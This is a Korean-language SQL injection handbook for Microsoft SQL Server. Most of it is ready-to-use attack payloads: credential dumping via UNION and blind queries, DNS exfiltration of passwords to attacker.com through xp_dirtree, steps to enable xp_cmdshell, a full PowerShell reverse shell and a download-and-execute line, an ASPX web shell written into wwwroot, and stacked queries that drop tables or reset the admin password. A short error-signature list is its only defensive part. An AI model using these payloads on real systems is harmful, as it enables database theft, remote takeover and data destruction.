# Microsoft SQL Server SQL Injection 완전 정복

> MSSQL 전용 SQLi 기법 상세 문서
> 버전: 1.0
> 최종 수정: 2025-01-26

---

## 목차

1. [MSSQL 기본 특성](#1-mssql-기본-특성)
2. [문자열 및 식별자 처리](#2-문자열-및-식별자-처리)
3. [주석 문법](#3-주석-문법)
4. [핵심 함수](#4-핵심-함수)
5. [시스템 테이블 및 뷰](#5-시스템-테이블-및-뷰)
6. [Error-based Injection](#6-error-based-injection)
7. [Union-based Injection](#7-union-based-injection)
8. [Boolean-based Blind](#8-boolean-based-blind)
9. [Time-based Blind](#9-time-based-blind)
10. [Out-of-band Techniques](#10-out-of-band-techniques)
11. [Stacked Queries](#11-stacked-queries)
12. [명령 실행 (xp_cmdshell)](#12-명령-실행-xp_cmdshell)
13. [파일 작업](#13-파일-작업)
14. [MSSQL 전용 우회 기법](#14-mssql-전용-우회-기법)
15. [버전별 차이점](#15-버전별-차이점)
16. [탐지 시그니처](#16-탐지-시그니처)
17. [치트시트](#17-치트시트)

---

## 1. MSSQL 기본 특성

### 1.1 버전 정보

```
┌─────────────────────────────────────────────────────────────┐
│                    MSSQL 주요 버전                          │
├──────────┬──────────────────────────────────────────────────┤
│  버전    │  특징                                           │
├──────────┼──────────────────────────────────────────────────┤
│  2005    │  CLR 통합, XML 지원, TRY-CATCH                  │
│  2008    │  날짜/시간 타입 개선, MERGE 문                  │
│  2008 R2 │  PowerPivot, StreamInsight                      │
│  2012    │  AlwaysOn, 컬럼스토어 인덱스, OFFSET/FETCH      │
│  2014    │  인메모리 OLTP, 지연 내구성                     │
│  2016    │  Always Encrypted, 동적 데이터 마스킹, JSON     │
│  2017    │  Linux 지원, Graph DB, Python 지원              │
│  2019    │  빅 데이터 클러스터, 지능형 쿼리 처리           │
│  2022    │  Azure 연동 강화, Ledger, Query Store 개선      │
└──────────┴──────────────────────────────────────────────────┘

Azure SQL Database도 유사한 문법 사용
```

### 1.2 기본 설정 확인

```sql
-- 버전 확인
SELECT @@version;
-- 예: Microsoft SQL Server 2019 (RTM) ...

-- 짧은 버전
SELECT SERVERPROPERTY('productversion');     -- 15.0.2000.5
SELECT SERVERPROPERTY('productlevel');       -- RTM
SELECT SERVERPROPERTY('edition');            -- Enterprise Edition

-- 현재 사용자
SELECT SYSTEM_USER;       -- 로그인명
SELECT USER;              -- 데이터베이스 사용자
SELECT SUSER_SNAME();     -- 로그인명
SELECT USER_NAME();       -- 데이터베이스 사용자명
SELECT ORIGINAL_LOGIN();  -- 원본 로그인

-- 현재 데이터베이스
SELECT DB_NAME();
SELECT DB_ID();

-- 서버명
SELECT @@SERVERNAME;
SELECT HOST_NAME();

-- 기타 정보
SELECT @@LANGUAGE;        -- 언어
SELECT @@SPID;            -- 세션 ID
SELECT @@MAX_CONNECTIONS; -- 최대 연결 수
```

### 1.3 권한 확인

```sql
-- 현재 사용자 권한
SELECT * FROM fn_my_permissions(NULL, 'SERVER');
SELECT * FROM fn_my_permissions(NULL, 'DATABASE');

-- sysadmin 여부
SELECT IS_SRVROLEMEMBER('sysadmin');

-- db_owner 여부
SELECT IS_MEMBER('db_owner');

-- 특정 권한 확인
SELECT HAS_PERMS_BY_NAME('master', 'DATABASE', 'SELECT');

-- 로그인/사용자 목록
SELECT * FROM sys.syslogins;
SELECT * FROM sys.server_principals;
SELECT * FROM sys.database_principals;
```

---

## 2. 문자열 및 식별자 처리

### 2.1 문자열 리터럴

```sql
-- 기본 문자열 (단일 따옴표)
SELECT 'hello';

-- 이중 따옴표 (QUOTED_IDENTIFIER 설정에 따라)
SELECT "hello";  -- 기본적으로 식별자로 해석

-- 이스케이프
SELECT 'it''s';              -- 따옴표 두 번

-- N-string (Unicode)
SELECT N'hello';             -- nvarchar
SELECT N'한글';              -- 유니코드 문자열

-- 바이너리/Hex
SELECT 0x68656C6C6F;         -- 'hello'의 hex
SELECT CONVERT(varchar, 0x68656C6C6F);  -- 'hello'
```

### 2.2 문자열 연결

```sql
-- + 연산자 (MSSQL 전용!)
SELECT 'hel' + 'lo';                -- 'hello'
SELECT 'a' + 'b' + 'c';             -- 'abc'

-- CONCAT 함수 (SQL Server 2012+)
SELECT CONCAT('hel', 'lo');         -- 'hello'
SELECT CONCAT('a', 'b', 'c');       -- 'abc'

-- CONCAT_WS (SQL Server 2017+)
SELECT CONCAT_WS(',', 'a', 'b', 'c');  -- 'a,b,c'

-- SQLi 활용
SELECT * FROM users WHERE name = 'ad' + 'min';
```

### 2.3 식별자

```sql
-- 대괄호로 감싸기 (MSSQL 전용!)
SELECT * FROM [select];
SELECT [column] FROM [table];
SELECT * FROM [users] WHERE [password] = 'test';

-- 이중 따옴표 (QUOTED_IDENTIFIER ON일 때)
SELECT * FROM "select";
SELECT "column" FROM "table";

-- 예약어 우회
SELECT * FROM [users] WHERE [select] = 1;
```

### 2.4 타입 변환

```sql
-- CAST
SELECT CAST('123' AS int);
SELECT CAST(123 AS varchar);
SELECT CAST(@@version AS varchar(max));

-- CONVERT (MSSQL 전용, 스타일 지정 가능)
SELECT CONVERT(int, '123');
SELECT CONVERT(varchar, 123);
SELECT CONVERT(varchar(100), GETDATE(), 120);  -- 날짜 형식

-- TRY_CAST / TRY_CONVERT (2012+, 에러 시 NULL)
SELECT TRY_CAST('abc' AS int);  -- NULL
SELECT TRY_CONVERT(int, 'abc'); -- NULL
```

---

## 3. 주석 문법

### 3.1 기본 주석

```sql
-- 한 줄 주석 (더블 대시 + 공백 권장)
SELECT * FROM users -- comment
SELECT * FROM users --comment  -- 공백 없어도 동작

-- 블록 주석
SELECT * FROM users /* comment */
SELECT /* comment */ * FROM users

-- 주석으로 공백 대체
SELECT/**/password/**/FROM/**/users
```

### 3.2 주석 활용 우회

```sql
-- 인라인 주석으로 키워드 분리
UN/**/ION SEL/**/ECT
EXEC/**/('command')

-- 주석으로 쿼리 종료
SELECT * FROM users WHERE id=1--

-- NULL 바이트로 주석 (일부 환경)
SELECT * FROM users WHERE id=1;%00
```

---

## 4. 핵심 함수

### 4.1 정보 수집 함수

```sql
-- 버전
@@version                      -- 전체 버전 문자열
SERVERPROPERTY('productversion')
SERVERPROPERTY('edition')

-- 사용자
SYSTEM_USER                    -- 로그인명
USER                           -- DB 사용자
SUSER_SNAME()                  -- 로그인명
USER_NAME()                    -- DB 사용자명
CURRENT_USER                   -- 현재 사용자
ORIGINAL_LOGIN()               -- 원본 로그인

-- 데이터베이스
DB_NAME()                      -- 현재 DB
DB_NAME(1)                     -- DB ID 1의 이름 (master)

-- 서버
@@SERVERNAME                   -- 서버명
HOST_NAME()                    -- 호스트명
@@SERVICENAME                  -- 서비스명

-- 기타
@@SPID                         -- 세션 ID
@@LANGUAGE                     -- 언어
@@MAX_CONNECTIONS              -- 최대 연결
```

### 4.2 문자열 함수

```sql
-- 연결
'a' + 'b'                      -- 'ab'
CONCAT('a', 'b')               -- 'ab' (2012+)
CONCAT_WS(',', 'a', 'b')       -- 'a,b' (2017+)

-- 추출
SUBSTRING('hello', 2, 3)       -- 'ell' (위치, 길이)
LEFT('hello', 2)               -- 'he'
RIGHT('hello', 2)              -- 'lo'

-- 위치
CHARINDEX('l', 'hello')        -- 3
PATINDEX('%l%', 'hello')       -- 3

-- 길이
LEN('hello')                   -- 5 (공백 제외)
DATALENGTH('hello')            -- 5 (바이트)

-- 변환
UPPER('hello')                 -- 'HELLO'
LOWER('HELLO')                 -- 'hello'
REVERSE('hello')               -- 'olleh'
REPLACE('hello', 'l', 'x')     -- 'hexxo'
LTRIM('  hello  ')             -- 'hello  '
RTRIM('  hello  ')             -- '  hello'
TRIM('  hello  ')              -- 'hello' (2017+)

-- 반복/패딩
REPLICATE('a', 5)              -- 'aaaaa'
SPACE(5)                       -- '     '
STUFF('hello', 2, 3, 'XYZ')    -- 'hXYZo' (위치, 길이, 대체문자)

-- ASCII
ASCII('a')                     -- 97
CHAR(97)                       -- 'a'
UNICODE(N'가')                 -- 44032
NCHAR(44032)                   -- N'가'
```

### 4.3 조건 함수

```sql
-- IIF (2012+)
IIF(1=1, 'yes', 'no')          -- 'yes'

-- CASE
CASE WHEN 1=1 THEN 'yes' ELSE 'no' END

-- ISNULL
ISNULL(NULL, 'default')        -- 'default'

-- NULLIF
NULLIF(1, 1)                   -- NULL
NULLIF(1, 2)                   -- 1

-- COALESCE
COALESCE(NULL, NULL, 'value')  -- 'value'

-- CHOOSE (2012+)
CHOOSE(2, 'a', 'b', 'c')       -- 'b'
```

### 4.4 시간 지연 함수

```sql
-- WAITFOR DELAY (시:분:초 형식)
WAITFOR DELAY '0:0:5';         -- 5초 지연
WAITFOR DELAY '00:00:05';      -- 5초 지연
WAITFOR DELAY '0:0:0.5';       -- 0.5초 지연

-- WAITFOR TIME (특정 시간까지)
WAITFOR TIME '12:00:00';       -- 12시까지 대기

-- 조건부 지연
IF (1=1) WAITFOR DELAY '0:0:5';

-- SQLi에서
'; WAITFOR DELAY '0:0:5'--
'; IF (1=1) WAITFOR DELAY '0:0:5'--
'; IF (SELECT SUBSTRING(username,1,1) FROM users)='a' WAITFOR DELAY '0:0:5'--
```

### 4.5 시스템 함수

```sql
-- 권한 확인
IS_SRVROLEMEMBER('sysadmin')           -- sysadmin 여부
IS_MEMBER('db_owner')                   -- db_owner 여부
HAS_PERMS_BY_NAME('master', 'DATABASE', 'SELECT')

-- 객체 정보
OBJECT_ID('users')                      -- 객체 ID
OBJECT_NAME(1234)                       -- 객체명
SCHEMA_NAME(SCHEMA_ID())                -- 스키마명
TYPE_NAME(TYPE_ID())                    -- 타입명

-- 메타데이터
COL_NAME(OBJECT_ID('users'), 1)         -- 첫 번째 컬럼명
INDEX_COL('users', 1, 1)                -- 인덱스 컬럼
```

---

## 5. 시스템 테이블 및 뷰

### 5.1 데이터베이스 목록

```sql
-- sys.databases
SELECT name FROM sys.databases;

-- master..sysdatabases (레거시)
SELECT name FROM master..sysdatabases;

-- INFORMATION_SCHEMA
SELECT catalog_name FROM INFORMATION_SCHEMA.SCHEMATA;

-- sp_databases
EXEC sp_databases;
```

### 5.2 테이블 목록

```sql
-- sys.tables (현재 DB)
SELECT name FROM sys.tables;

-- sysobjects (레거시)
SELECT name FROM sysobjects WHERE xtype = 'U';

-- INFORMATION_SCHEMA
SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE table_type = 'BASE TABLE';

-- sys.objects
SELECT name FROM sys.objects WHERE type = 'U';

-- 모든 DB의 테이블
SELECT DB_NAME(database_id), name FROM sys.dm_db_index_physical_stats(NULL, NULL, NULL, NULL, 'LIMITED');
```

### 5.3 컬럼 목록

```sql
-- sys.columns
SELECT name FROM sys.columns WHERE object_id = OBJECT_ID('users');

-- syscolumns (레거시)
SELECT name FROM syscolumns WHERE id = OBJECT_ID('users');

-- INFORMATION_SCHEMA
SELECT column_name FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name = 'users';

-- sp_columns
EXEC sp_columns 'users';
```

### 5.4 한 줄로 추출 (FOR XML / STRING_AGG)

```sql
-- FOR XML PATH (모든 버전)
SELECT name + ',' FROM sys.tables FOR XML PATH('');
-- 결과: table1,table2,table3,

-- STUFF + FOR XML (앞의 쉼표 제거)
SELECT STUFF((SELECT ',' + name FROM sys.tables FOR XML PATH('')), 1, 1, '');
-- 결과: table1,table2,table3

-- STRING_AGG (2017+)
SELECT STRING_AGG(name, ',') FROM sys.tables;
-- 결과: table1,table2,table3

-- 컬럼 목록
SELECT STRING_AGG(column_name, ',') FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name = 'users';
```

### 5.5 기타 유용한 시스템 뷰

```sql
-- 로그인/사용자
SELECT * FROM sys.server_principals;      -- 서버 수준
SELECT * FROM sys.database_principals;    -- DB 수준
SELECT * FROM sys.syslogins;              -- 로그인

-- 권한
SELECT * FROM sys.fn_my_permissions(NULL, 'SERVER');

-- 연결 정보
SELECT * FROM sys.dm_exec_connections;
SELECT * FROM sys.dm_exec_sessions;

-- 실행 중인 쿼리
SELECT * FROM sys.dm_exec_requests;

-- 링크 서버
SELECT * FROM sys.servers;
SELECT * FROM master..sysservers;

-- 확장 저장 프로시저
SELECT * FROM sys.extended_procedures;
```

---

## 6. Error-based Injection

### 6.1 CONVERT 에러

```sql
-- 타입 변환 에러로 데이터 추출
SELECT CONVERT(int, @@version);
-- 에러: Conversion failed when converting the nvarchar value 'Microsoft SQL Server 2019...' to data type int.

-- SQLi에서
' AND 1=CONVERT(int, @@version)--
' AND 1=CONVERT(int, (SELECT TOP 1 username FROM users))--
' AND 1=CONVERT(int, (SELECT TOP 1 password FROM users))--

-- 에러 메시지에 데이터 포함
```

### 6.2 CAST 에러

```sql
-- CONVERT와 유사
SELECT CAST(@@version AS int);

-- SQLi에서
' AND 1=CAST(@@version AS int)--
' AND 1=CAST((SELECT TOP 1 password FROM users) AS int)--
```

### 6.3 GROUP BY 에러

```sql
-- HAVING 절 에러
' HAVING 1=1--
-- 에러: Column 'xxx' is invalid in the select list because it is not contained in either an aggregate function or the GROUP BY clause.

-- 컬럼명 획득 가능
```

### 6.4 ORDER BY 에러

```sql
-- 컬럼 수 파악 + 에러
' ORDER BY 100--
-- 에러: The ORDER BY position number 100 is out of range of the number of items in the select list.
```

### 6.5 데이터 타입 에러

```sql
-- 다양한 에러 유발
' AND 1/0=1--           -- Divide by zero
' AND 1=(SELECT TOP 1 password FROM users)--  -- 서브쿼리 에러

-- XML Path 에러
' AND 1=(SELECT TOP 1 password FROM users FOR XML PATH(''))--
```

### 6.6 에러 기반 한계

```
MSSQL 에러 기반 특징:
- CONVERT/CAST 에러가 가장 효과적
- 에러 메시지 전체 출력 시 데이터 추출 용이
- 커스텀 에러 페이지에서는 제한적
- 문자열 길이 제한 (8000자 varchar, 4000자 nvarchar)
```

---

## 7. Union-based Injection

### 7.1 컬럼 수 파악

```sql
-- ORDER BY 방식
' ORDER BY 1--
' ORDER BY 5--
' ORDER BY 6--  (에러 시 컬럼 수 = 5)

-- UNION SELECT NULL 방식
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--

-- GROUP BY 방식
' GROUP BY 1--
```

### 7.2 출력 위치 파악

```sql
-- 숫자로 확인
' UNION SELECT 1,2,3,4,5--

-- 문자열로 확인 (타입 문제 방지)
' UNION SELECT NULL,'a',NULL,'b',NULL--
' UNION SELECT NULL,@@version,NULL,DB_NAME(),NULL--
```

### 7.3 데이터 추출 단계

```sql
-- Step 1: 데이터베이스 목록
' UNION SELECT NULL,name,NULL FROM master..sysdatabases--
' UNION SELECT NULL,STRING_AGG(name,','),NULL FROM sys.databases--

-- Step 2: 테이블 목록
' UNION SELECT NULL,name,NULL FROM sysobjects WHERE xtype='U'--
' UNION SELECT NULL,STRING_AGG(name,','),NULL FROM sys.tables--

-- Step 3: 컬럼 목록
' UNION SELECT NULL,name,NULL FROM syscolumns WHERE id=OBJECT_ID('users')--
' UNION SELECT NULL,STRING_AGG(column_name,','),NULL FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='users'--

-- Step 4: 데이터 추출
' UNION SELECT NULL,username+':'+password,NULL FROM users--
' UNION SELECT NULL,STRING_AGG(username+':'+password,','),NULL FROM users--
```

### 7.4 데이터 타입 문제 해결

```sql
-- NULL 사용
' UNION SELECT NULL,NULL,NULL--

-- 명시적 변환
' UNION SELECT NULL,CAST(id AS varchar),NULL FROM users--
' UNION SELECT NULL,CONVERT(varchar, id),NULL FROM users--
```

### 7.5 TOP / OFFSET-FETCH

```sql
-- TOP (모든 버전)
' UNION SELECT TOP 1 NULL,password,NULL FROM users--
' UNION SELECT TOP 1 NULL,password,NULL FROM users WHERE username NOT IN (SELECT TOP 0 username FROM users)--
' UNION SELECT TOP 1 NULL,password,NULL FROM users WHERE username NOT IN (SELECT TOP 1 username FROM users)--

-- OFFSET-FETCH (2012+)
' UNION SELECT NULL,password,NULL FROM users ORDER BY 1 OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY--
' UNION SELECT NULL,password,NULL FROM users ORDER BY 1 OFFSET 1 ROWS FETCH NEXT 1 ROWS ONLY--
```

---

## 8. Boolean-based Blind

### 8.1 기본 원리

```sql
-- 참 조건
' AND 1=1--
' AND 'a'='a'--

-- 거짓 조건
' AND 1=2--
' AND 'a'='b'--
```

### 8.2 데이터 추출

```sql
-- 문자 비교
' AND (SELECT SUBSTRING(username,1,1) FROM users WHERE id=1)='a'--

-- ASCII 이진 탐색
' AND ASCII(SUBSTRING((SELECT TOP 1 username FROM users),1,1)) > 96--

-- UNICODE (유니코드)
' AND UNICODE(SUBSTRING((SELECT TOP 1 username FROM users),1,1)) > 96--
```

### 8.3 문자열 길이 확인

```sql
' AND LEN((SELECT TOP 1 username FROM users)) > 5--
' AND LEN((SELECT TOP 1 username FROM users)) = 5--
```

### 8.4 행 수 확인

```sql
' AND (SELECT COUNT(*) FROM users) > 10--
' AND (SELECT COUNT(*) FROM users) = 15--
```

### 8.5 비트 연산

```sql
-- 비트 단위 추출
' AND (ASCII(SUBSTRING((SELECT TOP 1 password FROM users),1,1)) & 128) = 128--
' AND (ASCII(SUBSTRING((SELECT TOP 1 password FROM users),1,1)) & 64) = 64--
```

---

## 9. Time-based Blind

### 9.1 WAITFOR DELAY 기반

```sql
-- 기본 지연
'; WAITFOR DELAY '0:0:5'--
-- 5초 지연

-- 조건부 지연
'; IF (1=1) WAITFOR DELAY '0:0:5'--
'; IF (1=2) WAITFOR DELAY '0:0:5'--  (지연 없음)

-- 데이터 추출
'; IF (SELECT SUBSTRING(username,1,1) FROM users WHERE id=1)='a' WAITFOR DELAY '0:0:5'--

-- ASCII 이진 탐색
'; IF ASCII(SUBSTRING((SELECT TOP 1 password FROM users),1,1))>96 WAITFOR DELAY '0:0:5'--
```

### 9.2 인라인 조건

```sql
-- CASE 사용
'; SELECT CASE WHEN 1=1 THEN WAITFOR DELAY '0:0:5' END--

-- IIF 사용 (2012+)
'; SELECT IIF(1=1, (WAITFOR DELAY '0:0:5'), NULL)--
```

### 9.3 무거운 쿼리

```sql
-- WAITFOR 차단 시 대안
-- 대량 연산으로 지연
'; SELECT COUNT(*) FROM sys.columns a, sys.columns b, sys.columns c--

-- 재귀 CTE
'; WITH cte AS (SELECT 1 AS n UNION ALL SELECT n+1 FROM cte WHERE n<1000000) SELECT COUNT(*) FROM cte OPTION (MAXRECURSION 0)--
```

---

## 10. Out-of-band Techniques

### 10.1 xp_dirtree (DNS/UNC)

```sql
-- DNS 조회 유발
EXEC master..xp_dirtree '\\attacker.com\share';
EXEC master..xp_dirtree '\\' + (SELECT TOP 1 password FROM users) + '.attacker.com\a';

-- SQLi에서
'; EXEC master..xp_dirtree '\\attacker.com\share'--
'; DECLARE @p varchar(100); SET @p=(SELECT TOP 1 password FROM users); EXEC('master..xp_dirtree ''\\'+@p+'.attacker.com\a''')--
```

### 10.2 xp_fileexist

```sql
-- 파일/UNC 존재 확인 (DNS 유발)
EXEC master..xp_fileexist '\\attacker.com\share\file.txt';

-- SQLi에서
'; EXEC master..xp_fileexist '\\attacker.com\share'--
```

### 10.3 OPENROWSET

```sql
-- 원격 데이터 접근 (비활성화된 경우 많음)
SELECT * FROM OPENROWSET('SQLOLEDB', 'server';'user';'pass', 'SELECT 1');

-- HTTP 요청 (웹 서비스 접근 가능 시)
SELECT * FROM OPENROWSET('MSDASQL', 'DRIVER={SQL Server};SERVER=attacker.com;UID=sa;PWD=password', 'SELECT 1');
```

### 10.4 Linked Server

```sql
-- 링크 서버 목록
SELECT * FROM master..sysservers;

-- 링크 서버 통해 데이터 전송
EXEC ('SELECT * FROM OPENQUERY(LinkedServer, ''SELECT '+@@version+''')')

-- 링크 서버 생성 (권한 필요)
EXEC sp_addlinkedserver @server='attacker', @srvproduct='', @provider='SQLOLEDB', @datasrc='attacker.com';
```

### 10.5 제약 사항

```
Out-of-band 조건:
1. xp_cmdshell, xp_dirtree 등 활성화 필요
2. 방화벽에서 아웃바운드 허용
3. 적절한 권한 (sysadmin 등)

확인:
SELECT IS_SRVROLEMEMBER('sysadmin');
EXEC xp_dirtree 'C:\';  -- 테스트
```

---

## 11. Stacked Queries

### 11.1 MSSQL의 Stacked Queries

```
MSSQL은 기본적으로 Stacked Queries 완전 지원!
- ; 으로 여러 쿼리 실행 가능
- 매우 강력하고 위험
- INSERT, UPDATE, DELETE, EXEC 모두 가능
```

### 11.2 활용 예시

```sql
-- 테이블 삭제
'; DROP TABLE users;--

-- 데이터 삽입
'; INSERT INTO users VALUES ('hacker', 'password');--

-- 데이터 수정
'; UPDATE users SET password='hacked' WHERE username='admin';--

-- 테이블 생성
'; CREATE TABLE temp (data varchar(max));--

-- 프로시저 실행
'; EXEC xp_cmdshell 'whoami';--

-- 동적 SQL
'; EXEC('SELECT * FROM users');--
```

### 11.3 시간 지연 활용

```sql
-- Stacked Query로 지연
'; WAITFOR DELAY '0:0:5';--

-- 조건부 지연
'; IF (1=1) WAITFOR DELAY '0:0:5';--
'; IF (SELECT SUBSTRING(password,1,1) FROM users WHERE id=1)='a' WAITFOR DELAY '0:0:5';--
```

---

## 12. 명령 실행 (xp_cmdshell)

### 12.1 xp_cmdshell 기본

```sql
-- 기본 사용 (sysadmin 권한 필요)
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'dir C:\';
EXEC xp_cmdshell 'ipconfig';

-- 결과를 테이블에 저장
CREATE TABLE #output (line varchar(8000));
INSERT INTO #output EXEC xp_cmdshell 'dir C:\';
SELECT * FROM #output;
```

### 12.2 xp_cmdshell 활성화

```sql
-- xp_cmdshell 활성화 (기본 비활성화)
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

-- SQLi에서 (한 줄)
'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;--

-- 이후 명령 실행
'; EXEC xp_cmdshell 'whoami';--
```

### 12.3 대체 명령 실행 방법

```sql
-- sp_OACreate (OLE Automation)
DECLARE @shell INT;
EXEC sp_OACreate 'wscript.shell', @shell OUT;
EXEC sp_OAMethod @shell, 'run', NULL, 'cmd /c whoami > C:\output.txt';

-- 활성화
EXEC sp_configure 'Ole Automation Procedures', 1;
RECONFIGURE;

-- Agent Job
EXEC msdb..sp_add_job @job_name='test';
EXEC msdb..sp_add_jobstep @job_name='test', @step_name='cmd', @subsystem='CMDEXEC', @command='whoami';
EXEC msdb..sp_add_jobserver @job_name='test';
EXEC msdb..sp_start_job @job_name='test';
```

### 12.4 리버스 쉘

```sql
-- PowerShell 리버스 쉘
EXEC xp_cmdshell 'powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient(''attacker.com'',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + ''PS '' + (pwd).Path + ''> '';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"';

-- Nishang / Powercat
EXEC xp_cmdshell 'powershell IEX(New-Object Net.WebClient).downloadString(''http://attacker.com/shell.ps1'')';
```

---

## 13. 파일 작업

### 13.1 파일 읽기

```sql
-- OPENROWSET (BULK)
SELECT * FROM OPENROWSET(BULK 'C:\Windows\win.ini', SINGLE_CLOB) AS x;
SELECT BulkColumn FROM OPENROWSET(BULK 'C:\inetpub\wwwroot\web.config', SINGLE_CLOB) AS x;

-- xp_cmdshell
EXEC xp_cmdshell 'type C:\Windows\win.ini';

-- sp_OAMethod
-- ... (복잡함)
```

### 13.2 파일 쓰기

```sql
-- xp_cmdshell + echo
EXEC xp_cmdshell 'echo content > C:\output.txt';

-- BCP (Bulk Copy Program)
-- 데이터 → 파일
EXEC xp_cmdshell 'bcp "SELECT * FROM users" queryout "C:\users.txt" -c -T';

-- sp_OAMethod
DECLARE @fs INT, @file INT;
EXEC sp_OACreate 'Scripting.FileSystemObject', @fs OUT;
EXEC sp_OAMethod @fs, 'CreateTextFile', @file OUT, 'C:\output.txt', 1;
EXEC sp_OAMethod @file, 'WriteLine', NULL, 'content here';
```

### 13.3 웹쉘 생성

```sql
-- xp_cmdshell로 웹쉘 쓰기
EXEC xp_cmdshell 'echo ^<%@ Page Language="C#" %^>^<%Response.Write(System.Diagnostics.Process.Start("cmd.exe","/c "+Request["cmd"]).StandardOutput.ReadToEnd());%^> > C:\inetpub\wwwroot\shell.aspx';

-- 파워쉘로 다운로드
EXEC xp_cmdshell 'powershell -c "Invoke-WebRequest -Uri http://attacker.com/shell.aspx -OutFile C:\inetpub\wwwroot\shell.aspx"';
```

---

## 14. MSSQL 전용 우회 기법

### 14.1 대괄호 식별자

```sql
-- 예약어 우회
SELECT * FROM [users] WHERE [select] = 1;
SELECT [password] FROM [users];

-- SQLi에서
' UNION [SELECT] [password] FROM [users]--  (동작 안 함)
' UNION SELECT [password] FROM [users]--    (동작함)
```

### 14.2 문자열 연결 (+)

```sql
-- + 연산자로 연결 (MSSQL 전용)
SELECT 'ad' + 'min';
SELECT 'SEL' + 'ECT';

-- 동적 SQL 우회
EXEC('SEL' + 'ECT * FROM users');
```

### 14.3 EXEC 동적 실행

```sql
-- 문자열을 SQL로 실행
EXEC('SELECT * FROM users');
EXEC('SEL' + 'ECT * FROM users');

-- sp_executesql
EXEC sp_executesql N'SELECT * FROM users';
EXEC sp_executesql N'SELECT * FROM users WHERE name = @name', N'@name varchar(50)', @name='admin';
```

### 14.4 공백 대체

```sql
-- 가능한 공백 문자
%09  Tab
%0A  Line Feed
%0D  Carriage Return

-- 주석으로 공백
SELECT/**/password/**/FROM/**/users

-- + 로 공백 대체 (일부 상황)
UNION+SELECT+password+FROM+users
```

### 14.5 CHAR 함수

```sql
-- ASCII 코드로 문자 생성
SELECT CHAR(97);                                        -- 'a'
SELECT CHAR(97)+CHAR(100)+CHAR(109)+CHAR(105)+CHAR(110);  -- 'admin'

-- 동적 SQL과 조합
DECLARE @cmd varchar(100);
SET @cmd = CHAR(83)+CHAR(69)+CHAR(76)+CHAR(69)+CHAR(67)+CHAR(84);  -- 'SELECT'
EXEC(@cmd + ' * FROM users');
```

### 14.6 유니코드

```sql
-- NCHAR로 유니코드 문자
SELECT NCHAR(83)+NCHAR(69)+NCHAR(76)+NCHAR(69)+NCHAR(67)+NCHAR(84);  -- 'SELECT'

-- N-string
SELECT * FROM users WHERE name = N'admin';
```

---

## 15. 버전별 차이점

### 15.1 SQL Server 2005

```sql
-- INFORMATION_SCHEMA 뷰 사용 가능
-- TRY-CATCH 에러 처리
-- XML 데이터 타입
```

### 15.2 SQL Server 2008+

```sql
-- MERGE 문
-- DATE, TIME, DATETIME2 타입
-- 테이블 값 매개변수
```

### 15.3 SQL Server 2012+

```sql
-- OFFSET-FETCH (LIMIT 대체)
SELECT * FROM users ORDER BY id OFFSET 0 ROWS FETCH NEXT 10 ROWS ONLY;

-- TRY_CAST, TRY_CONVERT
SELECT TRY_CAST('abc' AS int);  -- NULL (에러 대신)

-- IIF 함수
SELECT IIF(1=1, 'yes', 'no');

-- CONCAT 함수
SELECT CONCAT('a', 'b', 'c');

-- THROW (RAISERROR 대체)
THROW 50000, 'Error message', 1;
```

### 15.4 SQL Server 2016+

```sql
-- STRING_SPLIT
SELECT * FROM STRING_SPLIT('a,b,c', ',');

-- JSON 지원
SELECT JSON_VALUE('{"name":"admin"}', '$.name');
SELECT JSON_QUERY('{"data":[1,2,3]}', '$.data');

-- DROP IF EXISTS
DROP TABLE IF EXISTS temp;

-- Always Encrypted (보안 강화)
```

### 15.5 SQL Server 2017+

```sql
-- STRING_AGG (GROUP_CONCAT 대체)
SELECT STRING_AGG(name, ',') FROM users;

-- CONCAT_WS
SELECT CONCAT_WS(',', 'a', 'b', 'c');

-- TRIM 함수
SELECT TRIM('  hello  ');

-- Linux 지원
```

---

## 16. 탐지 시그니처

### 16.1 에러 메시지 패턴

```yaml
mssql_error_patterns:
  - pattern: "Microsoft OLE DB Provider"
    confidence: 0.95
    indicates: "MSSQL OLE DB"

  - pattern: "ODBC SQL Server Driver"
    confidence: 0.95
    indicates: "MSSQL ODBC"

  - pattern: "SqlClient"
    confidence: 0.90
    indicates: ".NET SQL Client"

  - pattern: "SqlException"
    confidence: 0.90
    indicates: ".NET SQL Exception"

  - pattern: "Unclosed quotation mark"
    confidence: 0.95
    indicates: "MSSQL 문자열 에러"

  - pattern: "Incorrect syntax near"
    confidence: 0.90
    indicates: "MSSQL 문법 에러"

  - pattern: "Conversion failed when converting"
    confidence: 0.90
    indicates: "MSSQL 타입 변환 에러"

  - pattern: "Invalid column name"
    confidence: 0.85
    indicates: "MSSQL 컬럼 에러"

  - pattern: "Invalid object name"
    confidence: 0.85
    indicates: "MSSQL 테이블 에러"

  - pattern: "Arithmetic overflow"
    confidence: 0.80
    indicates: "MSSQL 산술 에러"

  - pattern: "nvarchar value"
    confidence: 0.85
    indicates: "MSSQL nvarchar 타입"
```

### 16.2 DBMS 확인 페이로드

```sql
-- 문법 특성
' AND 1=1--                    -- 모든 DB
'; WAITFOR DELAY '0:0:0'--     -- MSSQL 전용
[column]                       -- MSSQL 대괄호
'+'                            -- MSSQL 문자열 연결

-- 함수 기반
' AND @@version LIKE '%SQL Server%'--
' AND DB_NAME() IS NOT NULL--
' AND @@SERVERNAME IS NOT NULL--

-- 시스템 테이블
' AND (SELECT TOP 1 1 FROM sysobjects)=1--
' AND (SELECT TOP 1 1 FROM sys.tables)=1--
```

---

## 17. 치트시트

### 17.1 정보 수집 원라이너

```sql
-- 버전
